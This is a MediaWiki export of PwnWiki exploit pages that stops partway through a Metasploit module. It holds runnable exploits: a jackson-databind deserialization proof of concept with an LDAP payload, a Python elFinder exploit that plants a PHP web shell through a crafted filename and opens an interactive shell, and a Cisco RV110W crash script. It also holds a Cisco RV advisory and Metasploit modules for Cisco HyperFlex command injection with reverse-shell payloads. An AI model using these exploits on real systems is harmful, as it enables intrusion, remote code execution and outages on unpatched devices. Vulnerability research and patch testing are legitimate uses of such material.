<mediawiki xmlns="http://www.mediawiki.org/xml/export-0.11/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://www.mediawiki.org/xml/export-0.11/ http://www.mediawiki.org/xml/export-0.11.xsd" version="0.11" xml:lang="chinese">
  <siteinfo>
    <sitename>PwnWiki</sitename>
    <dbname>sql_www_pwnwiki_</dbname>
    <base>https://www.pwnwiki.org/index.php?title=Main_Page</base>
    <generator>MediaWiki 1.35.1</generator>
    <case>first-letter</case>
    <namespaces>
      <namespace key="-2" case="first-letter">Media</namespace>
      <namespace key="-1" case="first-letter">Special</namespace>
      <namespace key="0" case="first-letter" />
      <namespace key="1" case="first-letter">Talk</namespace>
      <namespace key="2" case="first-letter">User</namespace>
      <namespace key="3" case="first-letter">User talk</namespace>
      <namespace key="4" case="first-letter">PwnWiki</namespace>
      <namespace key="5" case="first-letter">PwnWiki talk</namespace>
      <namespace key="6" case="first-letter">File</namespace>
      <namespace key="7" case="first-letter">File talk</namespace>
      <namespace key="8" case="first-letter">MediaWiki</namespace>
      <namespace key="9" case="first-letter">MediaWiki talk</namespace>
      <namespace key="10" case="first-letter">Template</namespace>
      <namespace key="11" case="first-letter">Template talk</namespace>
      <namespace key="12" case="first-letter">Help</namespace>
      <namespace key="13" case="first-letter">Help talk</namespace>
      <namespace key="14" case="first-letter">Category</namespace>
      <namespace key="15" case="first-letter">Category talk</namespace>
      <namespace key="274" case="first-letter">Widget</namespace>
      <namespace key="275" case="first-letter">Widget talk</namespace>
      <namespace key="710" case="first-letter">TimedText</namespace>
      <namespace key="711" case="first-letter">TimedText talk</namespace>
      <namespace key="828" case="first-letter">Module</namespace>
      <namespace key="829" case="first-letter">Module talk</namespace>
      <namespace key="1198" case="first-letter">Translations</namespace>
      <namespace key="1199" case="first-letter">Translations talk</namespace>
    </namespaces>
  </siteinfo>
  <page>
    <title>CVE-2020-9548 jackson-databind RCE漏洞</title>
    <ns>0</ns>
    <id>1575</id>
    <revision>
      <id>1971</id>
      <timestamp>2021-05-01T01:31:46Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==漏洞利用==  編譯Exploit.java: &lt;pre&gt; import java.lang.Runtime;  public class Exploit {     static {         try {             Runtime.getRuntime().exec("calc");..."</comment>
      <origin>1971</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="1066" sha1="qfq4gnmacl0m97p6c5bs3o87f4wh3yf" xml:space="preserve">==漏洞利用==

編譯Exploit.java:
&lt;pre&gt;
import java.lang.Runtime;

public class Exploit {
    static {
        try {
            Runtime.getRuntime().exec("calc");
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
&lt;/pre&gt;

搭建HTTP服務 使用Python搭建簡易SimpleHTTPServer服務：

搭建LDAP服務 使用marshalsec來啟動一個LDAP服務：

執行漏洞POC1 Poc.java代碼如下所示：
&lt;pre&gt;
package com.jacksonTest;

import com.fasterxml.jackson.databind.ObjectMapper;
import java.io.IOException;

public class Poc {
    public static void main(String[] args) throws Exception {
       ObjectMapper mapper = new ObjectMapper();
        mapper.enableDefaultTyping();
        String payload = "[\"br.com.anteros.dbcp.AnterosDBCPConfig\", {\"metricRegistry\":\"ldap://127.0.0.1:1099/Exploit\"}]";
        try {
            mapper.readValue(payload, Object.class);
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}
&lt;/pre&gt;

之後運行該程序，成功執行命令，彈出計算器</text>
      <sha1>qfq4gnmacl0m97p6c5bs3o87f4wh3yf</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-0741 elFinder 2.0.47 - 'PHP connector' 命令注入漏洞</title>
    <ns>0</ns>
    <id>5419</id>
    <revision>
      <id>6220</id>
      <timestamp>2021-07-03T05:17:07Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "&lt;pre&gt; #!/usr/bin/python  ''' # Exploit Title: elFinder &lt;= 2.1.47 - Command Injection vulnerability in the PHP connector. # Date: 01/07/2021 # Exploit Author: @hamzaanonime # V..."</comment>
      <origin>6220</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="2231" sha1="7m7j5d6eudbze4ctd661evt63emhir7" xml:space="preserve">&lt;pre&gt;
#!/usr/bin/python

'''
# Exploit Title: elFinder &lt;= 2.1.47 - Command Injection vulnerability in the PHP connector.
# Date: 01/07/2021
# Exploit Author: @hamzaanonime
# Vulnerability reported by: Thomas Chauchefoin
# Google Dork: intitle:"elFinder 2.0.x"
# Vendor Homepage: https://studio-42.github.io/elFinder/
# Software Link: https://github.com/Studio-42/elFinder/archive/2.1.47.tar.gz
# Version: &lt;= 2.1.47
# Tested on: Linux 64bit + Python2.7
# PoC: https://www.secsignal.org/news/cve-2019-9194-triggering-and-exploiting-a-1-day-vulnerability/
# CVE: CVE-2021-0741

# Usage: python exploit.py [URL]

'''

import requests

import json

import sys


payload = 'SecSignal.jpg;echo 3c3f7068702073797374656d28245f4745545b2263225d293b203f3e0a | xxd -r -p &gt; SecSignal.php;echo SecSignal.jpg'


def usage():

    if len(sys.argv) != 2:

        print "Usage: python exploit.py [URL]"

        sys.exit(0)


def upload(url, payload):

    files = {'upload[]': (payload, open('SecSignal.jpg', 'rb'))}

    data = {"reqid" : "1693222c439f4", "cmd" : "upload", "target" : "l1_Lw", "mtime[]" : "1497726174"}

    r = requests.post("%s/php/connector.minimal.php" % url, files=files, data=data)

    j = json.loads(r.text)

    return j['added'][0]['hash']


def imgRotate(url, hash):

    r = requests.get("%s/php/connector.minimal.php?target=%s&amp;width=539&amp;height=960&amp;degree=180&amp;quality=100&amp;bg=&amp;mode=rotate&amp;cmd=resize&amp;reqid=169323550af10c" % (url, hash))

    return r.text


def shell(url):

    r = requests.get("%s/php/SecSignal.php" % url)

    if r.status_code == 200:

       print "[+] Pwned! :)"

       print "[+] Getting the shell..."

       while 1:

           try:

               input = raw_input("$ ")

               r = requests.get("%s/php/SecSignal.php?c=%s" % (url, input))

               print r.text

           except KeyboardInterrupt:

               sys.exit("\nBye kaker!")

    else:

        print "[*] The site seems not to be vulnerable :("


def main():

    usage()

    url = sys.argv[1]

    print "[*] Uploading the malicious image..."

    hash = upload(url, payload)

    print "[*] Running the payload..."

    imgRotate(url, hash)

    shell(url)


if __name__ == "__main__":

    main()
&lt;/pre&gt;</text>
      <sha1>7m7j5d6eudbze4ctd661evt63emhir7</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-1167 Cisco RV110W 1.2.1.7 拒絕服務漏洞</title>
    <ns>0</ns>
    <id>3233</id>
    <revision>
      <id>3771</id>
      <timestamp>2021-05-31T04:10:07Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==EXP== &lt;pre&gt; # Exploit Title: Cisco RV110W 1.2.1.7 - 'vpn_account' Denial of Service (PoC) # Date: 2021-01 # Exploit Author: Shizhi He # Vendor Homepage: https://www.cisco.co..."</comment>
      <origin>3771</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="4073" sha1="rzl7dckx7aj9k1ooyvuejgibl783ewk" xml:space="preserve">==EXP==
&lt;pre&gt;
# Exploit Title: Cisco RV110W 1.2.1.7 - 'vpn_account' Denial of Service (PoC)
# Date: 2021-01
# Exploit Author: Shizhi He
# Vendor Homepage: https://www.cisco.com/
# Software Link: https://software.cisco.com/download/home/283879340/type/282487380/release/1.2.1.7
# Version: V1.2.1.7
# Tested on: RV110W V1.2.1.7
# CVE : CVE-2021-1167
# References: 
# https://github.com/pwnninja/cisco/blob/main/vpn_client_stackoverflow.md 
# https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-rv-overflow-WUnUgv4U

#!/usr/bin/env python2

#####
## Cisco RV110W Remote Stack Overflow.
### Tested on version: V1.2.1.7 (maybe useable on other products and versions)


import os
import sys
import re
import urllib
import urllib2
import getopt
import json
import hashlib
import ssl

ssl._create_default_https_context = ssl._create_unverified_context

###
# Usage: ./CVE-2021-1167.py 192.168.1.1 443 cisco cisco
# This PoC will crash the target HTTP/HTTPS service
###

#encrypt password
def enc(s):
    l = len(s)
    s += "%02d" % l
    mod = l + 2
    ans = ""
    for i in range(64):
  tmp = i % mod
  ans += s[tmp]
    return hashlib.md5(ans).hexdigest()

if __name__ == "__main__":
    print "Usage: ./CVE-2021-1167.py 192.168.1.1 443 cisco cisco"

    IP = sys.argv[1]
    PORT = sys.argv[2]
    USERNAME = sys.argv[3]
    PASSWORD = enc(sys.argv[4])    
    url = 'https://' + IP + ':' + PORT + '/' 

    #get session_id by POST login.cgi
    req = urllib2.Request(url + "login.cgi")
    req.add_header('Origin', url)
    req.add_header('Upgrade-Insecure-Requests', 1)
    req.add_header('Content-Type', 'application/x-www-form-urlencoded')
    req.add_header('User-Agent',
                    'Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko)')
    req.add_header('Accept', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8')
    req.add_header('Referer', url)
    req.add_header('Accept-Encoding', 'gzip, deflate')
    req.add_header('Accept-Language', 'en-US,en;q=0.9')
    req.add_header('Cookie', 'SessionID=')
    data = {"submit_button": "login",
            "submit_type": "",
            "gui_action": "",
            "wait_time": "0",
            "change_action": "",
            "enc": "1",
            "user": USERNAME,
            "pwd": PASSWORD,
            "sel_lang": "EN"
            }
    r = urllib2.urlopen(req, urllib.urlencode(data))
    resp = r.read()
    login_st = re.search(r'.*login_st=\d;', resp).group().split("=")[1]
    session_id = re.search(r'.*session_id.*\";', resp).group().split("\"")[1]
    print session_id
    
    #trigger stack overflow through POST vpn_account parameter and cause denial of service
    req2 = urllib2.Request(url + "apply.cgi;session_id=" + session_id)
    req2.add_header('Origin', url)
    req2.add_header('Upgrade-Insecure-Requests', 1)
    req2.add_header('Content-Type', 'application/x-www-form-urlencoded')
    req2.add_header('User-Agent',
                    'Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko)')
    req2.add_header('Accept', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8')
    req2.add_header('Referer', url)
    req2.add_header('Accept-Encoding', 'gzip, deflate')
    req2.add_header('Accept-Language', 'en-US,en;q=0.9')
    req2.add_header('Cookie', 'SessionID=')
    poc = "a" * 4096
    data_cmd = {
            "gui_action": "Apply",
            "submit_type": "",
            "submit_button": "vpn_client",
            "change_action": "",
            "pptpd_enable": "0",
            "pptpd_localip": "10.0.0.1",
            "pptpd_remoteip": "10.0.0.10-14",
            "pptpd_account": "",
            "vpn_pptpd_account": "1",
            "vpn_account": poc,
            "change_lan_ip": "0",
            "netbios_enable": "0",
            "mppe_disable": "0",
            "importvpnclient": "",
            "browser": "",
            "webpage_end": "1",
            }
    r = urllib2.urlopen(req2, urllib.urlencode(data_cmd))
    resp = r.read()
    print resp
&lt;/pre&gt;</text>
      <sha1>rzl7dckx7aj9k1ooyvuejgibl783ewk</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-1472&amp;CVE-2021-1473 Cisco RV 身份驗證繞過&amp;命令執行漏洞</title>
    <ns>0</ns>
    <id>3111</id>
    <revision>
      <id>3614</id>
      <timestamp>2021-05-30T02:18:48Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==EXP== &lt;pre&gt; IoT Inspector Research Lab Security Advisory IOT-20210414-0 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~               title:..."</comment>
      <origin>3614</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="8255" sha1="872ivxwvfx50cpxibhyup6deid3bceq" xml:space="preserve">==EXP==
&lt;pre&gt;
IoT Inspector Research Lab Security Advisory IOT-20210414-0
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
              title: Cisco RV series Authentication Bypass and Remote Command 
                     Execution
     vendor/product: Cisco (https://www.cisco.com/)
 vulnerable version: RV16X/RV26X: 1.0.01.02 &amp; below.
                     RV34X: 1.0.03.20 &amp; below.
      fixed version: RV16X/RV26X: 1.0.01.03. 
                     RV34X: 1.0.03.21.
         CVE number: CVE-2021-1472, CVE-2021-1473
             impact: 5.3 (medium) CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N
                     8.8 (high)   CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L
           reported: 2021-01-02
        publication: 2021-04-14
                 by: T Shiomitsu, IoT Inspector Research Lab
                     https://www.iot-inspector.com/

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Vendor description:
-------------------
The RV series devices are Cisco's line of small business routers with extra
functionality, including VPN and other security measures. 


Vulnerability overview/description:
-----------------------------------
All Cisco RV-series routers suffer from an authentication bypass vulnerability.
The RV34X series are also affected by a command injection vulnerability in the
sessionid cookie, when requesting the /upload endpoint. A combination of these
issues would allow any person who is able to communicate with the web 
interface to run arbitrary system commands on the router as the www-data user.


Root Cause Analysis:
--------------------
CVE-2021-1472: /upload Authentication Bypass Vulnerability

While Cisco has noted that this issue also affects the RV160, I will provide
a RCA for only the RV34X series here.

The RV340 web interface is served by nginx on port 443. The nginx configuration
(found in files in /etc/nginx) is such that requests made to the web interface
URIs /upload, /form-file-upload and 
/api/operations/ciscosb-file:form-file-upload are all proxied to a CGI binary 
called upload.cgi. Depending on which URI is requested, the behaviour of the 
binary will be slightly different.

While some attempt was introduced in recent firmware revisions to prevent 
unauthenticated access to the functionality available at the /upload endpoint,
the authentication check is incomplete. An attacker simply has to pass any 
generic Authorization header as part of the request to bypass the authorization
check. This can be seen in web.upload.conf:

[...snip...]
location /upload {
        set $deny 1;

        if ($http_authorization != "") {
                set $deny "0";
        }

        if (-f /tmp/websession/token/$cookie_sessionid) {
                set $deny "0";
        }

        if ($deny = "1") {
                return 403;
        }
[...snip...]

As can be seen, the $deny is set to 0 if the $cookie_sessionid is valid (i.e. 
that the authorization file exists on the system). But it also set to 0 if the
$http_authorization value (i.e. the Authorization header) is not blank. 
Therefore, passing any value to an Authorization header can allow an attacker
access to the /upload endpoint.

CVE-2021-1473: /upload sessionid Command Injection Remote Code Execution

Within the main() function in upload.cgi, the HTTP_COOKIE environmental 
variable is read, and the value from the sessionid cookie is extracted using 
a simple series of strtok_r and strstr. This specific sessionid-reading logic 
is notable because, due to the strtok_r call, it's not possible to use ";" 
characters in any injection, as it will prematurely terminate the injection 
string. In pseudocode, it looks like this:

if (HTTP_COOKIE != (char *)0x0) { 
     StrBufSetStr(cookie,HTTP_COOKIE); 
     cookie = StrBufToStr(cookie); 
     cookie = strtok_r(cookie, ";", &amp;saveptr); 
     while (cookie != 0x0) { 
       cookie = strstr(cookie, "sessionid="); 
       if (cookie != 0x0) { 
         sessionid_cookie_value = pathparam_ + 10; 
       } 
     } 
   }

Because our HTTP request is made to the /upload URI, the main() function in 
upload.cgi calls a function at 000124a4, which I've named handle_upload(). 
This function takes a pointer to the sessionid cookie value as its first 
argument.

void handle_upload(char *sessionId, char *destination, char *option, 
    char *pathparam, char *fileparam, char *cert_name, char *cert_type, 
    char *password) 

It also takes several other arguments, each of which are populated by the 
multipart request parsing that takes place in the main() function. The names 
I've given these arguments roughly align with the names of the parameters 
that this multipart ingesting logic looks for.

(Depending on what string is passed as the pathparam parameter, slightly 
different code paths will be taken, which means that slightly different checks
must be bypassed to be able to reach the vulnerable code. In this example, I 
am using a request with the pathparam set to "Configuration", so the pseudocode
I'm showing reflects this.)

Within handle_upload(), a curl command is constructed with a call to sprintf, 
the resulting buffer of which is then passed directly to popen:

ret = strcmp(pathparam, "Configuration"); 
 if (ret == 0) { 
   config_json = upload_Configuration_json(destination,fileparam); 
   if (config_json != 0) { 
     post_data = json_object_to_json_string(config_json); 
     sprintf(command_buf, "curl %s --cookie \'sessionid=%s\' -X POST -H \'Content-Type: application/json\' -d\'%s\' ", jsonrpc_cgi, sessionId , post_data); 
     debug("curl_cmd=%s",command_buf); 
     __stream = popen(command_buf, "r"); 
     if (__stream != (FILE *)0x0) { 
       [...snip...] 
   }

The sessionid cookie value that we have passed in our request is passed 
directly into this sprintf() call. With a crafted sessionid value, we would 
therefore be able to inject arbitrary commands into this command buffer. This 
will run the command with the privileges of the upload.cgi process which, in 
this case, is www-data.


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Vulnerable / tested versions:
-----------------------------
Cisco RV16X, RV26X and RV34X series devices.


Solution:
---------
Apply Cisco-supplied patch. For RV16X/26X, 1.0.01.03. For RV34X, 1.0.03.21.


Advisory URL:
-------------
https://www.iot-inspector.com/blog/advisory-cisco-rv34x-authentication-bypass-remote-command-execution/


Vendor contact timeline:
------------------------
2021-01-02: Initial disclosure made to Cisco PSIRT.
2021-01-07: Confirmation of receipt of disclosure from Cisco PSIRT.
2021-01-27: Confirmation that issue is valid from Cisco PSIRT.
2021-02-12: Update from Cisco PSIRT.
2021-03-23: We contact Cisco PSIRT for timeline update and CVE IDs.
2021-03-23: Cisco PSIRT respond giving us timeline and CVE IDs.
2021-04-07: Cisco release advisory.


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

The IoT Inspector Research Lab is an integrated part of IoT Inspector.

IoT Inspector is a platform for automated security analysis and compliance 
checks of IoT firmware. Our mission is to secure the Internet of Things. In 
order to discover vulnerabilities and vulnerability patterns within IoT devices
and to further enhance automated identification that allows for scalable 
detection within IoT Inspector, we conduct excessive security research in the
area of IoT. 

Whenever the IoT Inspector Research Lab discovers vulnerabilities in IoT 
firmware, we aim to responsibly disclose relevant information to the vendor
of the affected IoT device as well as the general public in a way that 
minimizes potential harm and encourages further security analyses of IoT 
systems.

You can find our responsible disclosure policy here:
https://www.iot-inspector.com/responsible-disclosure-policy/


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Interested in using IoT Inspector for your research or product?

Mail: research at iot-inspector dot com
Web: https://www.iot-inspector.com
Blog: https://www.iot-inspector.com/blog/
Twitter: https://twitter.com/iotinspector

EOF T Shiomitsu / @2021
&lt;/pre&gt;</text>
      <sha1>872ivxwvfx50cpxibhyup6deid3bceq</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-1497&amp;CVE-2021-1498 Cisco HyperFlex HX Data Platform 命令執行漏洞</title>
    <ns>0</ns>
    <id>3564</id>
    <revision>
      <id>4141</id>
      <timestamp>2021-06-06T13:48:03Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "&lt;languages /&gt; ==MSF== &lt;translate&gt; 以 Tomcat 用戶身份執行 shell 命令。 &lt;/translate&gt;  &lt;pre&gt; ## # This module requires Metasploit: https://metasploit.com/download # Cur..."</comment>
      <origin>4141</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="4010" sha1="af26u7ynhausm8684er3k7l3p67ou7t" xml:space="preserve">&lt;languages /&gt;
==MSF==
&lt;translate&gt;
以 Tomcat 用戶身份執行 shell 命令。
&lt;/translate&gt;

&lt;pre&gt;
##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule &lt; Msf::Exploit::Remote

  Rank = ExcellentRanking

  prepend Msf::Exploit::Remote::AutoCheck
  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::CmdStager

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' =&gt; 'Cisco HyperFlex HX Data Platform Command Execution',
        'Description' =&gt; %q{
          This module exploits an unauthenticated command injection in Cisco
          HyperFlex HX Data Platform's /storfs-asup endpoint to execute shell
          commands as the Tomcat user.
        },
        'Author' =&gt; [
          'Nikita Abramov', # Discovery
          'Mikhail Klyuchnikov', # Discovery
          'wvu' # Analysis and exploit
        ],
        'References' =&gt; [
          ['CVE', '2021-1497'], # HyperFlex HX Data Platform Installer
          ['CVE', '2021-1498'], # HyperFlex HX Data Platform
          ['URL', 'https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-hyperflex-rce-TjjNrkpR'],
          ['URL', 'https://attackerkb.com/assessments/4f532147-b27b-4079-aed1-5cfdc402cf5c'],
          ['URL', 'https://twitter.com/ptswarm/status/1390300625129201664']
        ],
        'DisclosureDate' =&gt; '2021-05-05',
        'License' =&gt; MSF_LICENSE,
        'Platform' =&gt; ['unix', 'linux'],
        'Arch' =&gt; [ARCH_CMD, ARCH_X86, ARCH_X64],
        'Privileged' =&gt; false, # Privesc left as an exercise for the reader
        'Targets' =&gt; [
          [
            'Unix Command',
            {
              'Platform' =&gt; 'unix',
              'Arch' =&gt; ARCH_CMD,
              'Type' =&gt; :unix_cmd,
              'DefaultOptions' =&gt; {
                'PAYLOAD' =&gt; 'cmd/unix/reverse_python_ssl'
              }
            }
          ],
          [
            'Linux Dropper',
            {
              'Platform' =&gt; 'linux',
              'Arch' =&gt; [ARCH_X86, ARCH_X64],
              'Type' =&gt; :linux_dropper,
              'DefaultOptions' =&gt; {
                'PAYLOAD' =&gt; 'linux/x64/meterpreter/reverse_tcp'
              }
            }
          ]
        ],
        'DefaultTarget' =&gt; 0,
        'Notes' =&gt; {
          'Stability' =&gt; [CRASH_SAFE],
          'Reliability' =&gt; [REPEATABLE_SESSION],
          'SideEffects' =&gt; [IOC_IN_LOGS, ARTIFACTS_ON_DISK]
        }
      )
    )

    register_options([
      OptString.new('TARGETURI', [true, 'Base path', '/'])
    ])

    register_advanced_options([
      OptFloat.new('CmdExecTimeout', [true, 'Command execution timeout', 3.5])
    ])
  end

  def check
    res = send_request_cgi(
      'method' =&gt; %w[GET POST].sample,
      'uri' =&gt; normalize_uri(target_uri.path, 'storfs-asup')
    )

    return CheckCode::Unknown unless res

    unless res.code == 200 &amp;&amp;
           res.body.include?('Action for the servlet need be specified.')
      return CheckCode::Safe
    end

    CheckCode::Vulnerable('Storfs ASUP servlet detected.')
  end

  def exploit
    print_status("Selected #{payload_instance.refname} (#{target.name})")

    case target['Type']
    when :unix_cmd
      execute_command(payload.encoded)
    when :linux_dropper
      execute_cmdstager
    end
  end

  def execute_command(cmd, _opts = {})
    print_status("Executing command: #{cmd}")

    res = send_request_cgi({
      'method' =&gt; 'POST',
      'uri' =&gt; normalize_uri(target_uri.path, 'storfs-asup'),
      'vars_post' =&gt; {
        'action' =&gt; Faker::Hacker.verb,
        %w[token mode].sample =&gt; "$(#{cmd})"
      }
    }, datastore['CmdExecTimeout'])

    unless res
      print_warning('Command execution timed out')
      return
    end

    unless res.code == 200
      fail_with(Failure::PayloadFailed, 'Failed to execute command')
    end

    print_good('Successfully executed command')
  end

end
&lt;/pre&gt;</text>
      <sha1>af26u7ynhausm8684er3k7l3p67ou7t</sha1>
    </revision>
    <revision>
      <id>4142</id>
      <parentid>4141</parentid>
      <timestamp>2021-06-06T13:48:43Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Marked this version for translation</comment>
      <origin>4142</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="4021" sha1="6d7y1esl9ztv18ock18e6kr9v0777es" xml:space="preserve">&lt;languages /&gt;
==MSF==
&lt;translate&gt;
&lt;!--T:1--&gt;
以 Tomcat 用戶身份執行 shell 命令。
&lt;/translate&gt;

&lt;pre&gt;
##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule &lt; Msf::Exploit::Remote

  Rank = ExcellentRanking

  prepend Msf::Exploit::Remote::AutoCheck
  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::CmdStager

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' =&gt; 'Cisco HyperFlex HX Data Platform Command Execution',
        'Description' =&gt; %q{
          This module exploits an unauthenticated command injection in Cisco
          HyperFlex HX Data Platform's /storfs-asup endpoint to execute shell
          commands as the Tomcat user.
        },
        'Author' =&gt; [
          'Nikita Abramov', # Discovery
          'Mikhail Klyuchnikov', # Discovery
          'wvu' # Analysis and exploit
        ],
        'References' =&gt; [
          ['CVE', '2021-1497'], # HyperFlex HX Data Platform Installer
          ['CVE', '2021-1498'], # HyperFlex HX Data Platform
          ['URL', 'https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-hyperflex-rce-TjjNrkpR'],
          ['URL', 'https://attackerkb.com/assessments/4f532147-b27b-4079-aed1-5cfdc402cf5c'],
          ['URL', 'https://twitter.com/ptswarm/status/1390300625129201664']
        ],
        'DisclosureDate' =&gt; '2021-05-05',
        'License' =&gt; MSF_LICENSE,
        'Platform' =&gt; ['unix', 'linux'],
        'Arch' =&gt; [ARCH_CMD, ARCH_X86, ARCH_X64],
        'Privileged' =&gt; false, # Privesc left as an exercise for the reader
        'Targets' =&gt; [
          [
            'Unix Command',
            {
              'Platform' =&gt; 'unix',
              'Arch' =&gt; ARCH_CMD,
              'Type' =&gt; :unix_cmd,
              'DefaultOptions' =&gt; {
                'PAYLOAD' =&gt; 'cmd/unix/reverse_python_ssl'
              }
            }
          ],
          [
            'Linux Dropper',
            {
              'Platform' =&gt; 'linux',
              'Arch' =&gt; [ARCH_X86, ARCH_X64],
              'Type' =&gt; :linux_dropper,
              'DefaultOptions' =&gt; {
                'PAYLOAD' =&gt; 'linux/x64/meterpreter/reverse_tcp'
              }
            }
          ]
        ],
        'DefaultTarget' =&gt; 0,
        'Notes' =&gt; {
          'Stability' =&gt; [CRASH_SAFE],
          'Reliability' =&gt; [REPEATABLE_SESSION],
          'SideEffects' =&gt; [IOC_IN_LOGS, ARTIFACTS_ON_DISK]
        }
      )
    )

    register_options([
      OptString.new('TARGETURI', [true, 'Base path', '/'])
    ])

    register_advanced_options([
      OptFloat.new('CmdExecTimeout', [true, 'Command execution timeout', 3.5])
    ])
  end

  def check
    res = send_request_cgi(
      'method' =&gt; %w[GET POST].sample,
      'uri' =&gt; normalize_uri(target_uri.path, 'storfs-asup')
    )

    return CheckCode::Unknown unless res

    unless res.code == 200 &amp;&amp;
           res.body.include?('Action for the servlet need be specified.')
      return CheckCode::Safe
    end

    CheckCode::Vulnerable('Storfs ASUP servlet detected.')
  end

  def exploit
    print_status("Selected #{payload_instance.refname} (#{target.name})")

    case target['Type']
    when :unix_cmd
      execute_command(payload.encoded)
    when :linux_dropper
      execute_cmdstager
    end
  end

  def execute_command(cmd, _opts = {})
    print_status("Executing command: #{cmd}")

    res = send_request_cgi({
      'method' =&gt; 'POST',
      'uri' =&gt; normalize_uri(target_uri.path, 'storfs-asup'),
      'vars_post' =&gt; {
        'action' =&gt; Faker::Hacker.verb,
        %w[token mode].sample =&gt; "$(#{cmd})"
      }
    }, datastore['CmdExecTimeout'])

    unless res
      print_warning('Command execution timed out')
      return
    end

    unless res.code == 200
      fail_with(Failure::PayloadFailed, 'Failed to execute command')
    end

    print_good('Successfully executed command')
  end

end
&lt;/pre&gt;</text>
      <sha1>6d7y1esl9ztv18ock18e6kr9v0777es</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-1499 Cisco HyperFlex HX Data Platform 文件上傳&amp;遠程代碼執行漏洞</title>
    <ns>0</ns>
    <id>4679</id>
    <revision>
      <id>5379</id>
      <timestamp>2021-06-20T01:57:37Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "&lt;languages /&gt; &lt;translate&gt; ==漏洞影響== &lt;/translate&gt; &lt;pre&gt; Cisco HyperFlex HX Data Platform &lt;/pre&gt;  ==EXP== &lt;pre&gt; ## # This module requires Metasploit: https://metasploit.c..."</comment>
      <origin>5379</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="5868" sha1="1nwynkcim00kcs1vcdhn4ayu77sks9t" xml:space="preserve">&lt;languages /&gt;
&lt;translate&gt;
==漏洞影響==
&lt;/translate&gt;
&lt;pre&gt;
Cisco HyperFlex HX Data Platform
&lt;/pre&gt;

==EXP==
&lt;pre&gt;
##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule &lt; Msf::Exploit::Remote

  Rank = ExcellentRanking

  prepend Msf::Exploit::Remote::AutoCheck
  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::FileDropper

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' =&gt; 'Cisco HyperFlex HX Data Platform unauthenticated file upload to RCE (CVE-2021-1499)',
        'Description' =&gt; %q{
          This module exploits an unauthenticated file upload vulnerability in
          Cisco HyperFlex HX Data Platform's /upload endpoint to upload and
          execute a payload as the Tomcat user.
        },
        'Author' =&gt; [
          'Nikita Abramov',      # Discovery
          'Mikhail Klyuchnikov', # Discovery
          'wvu',                 # Research and guidance
          'jheysel-r7'           # Metasploit Module
        ],
        'References' =&gt; [
          ['CVE', '2021-1499'], # HyperFlex HX File Upload
          ['URL', 'https://attackerkb.com/assessments/82738621-1114-4aba-990a-9ea007b05834']
        ],
        'DisclosureDate' =&gt; '2021-05-05',
        'License' =&gt; MSF_LICENSE,
        'Platform' =&gt; ['unix', 'linux'],
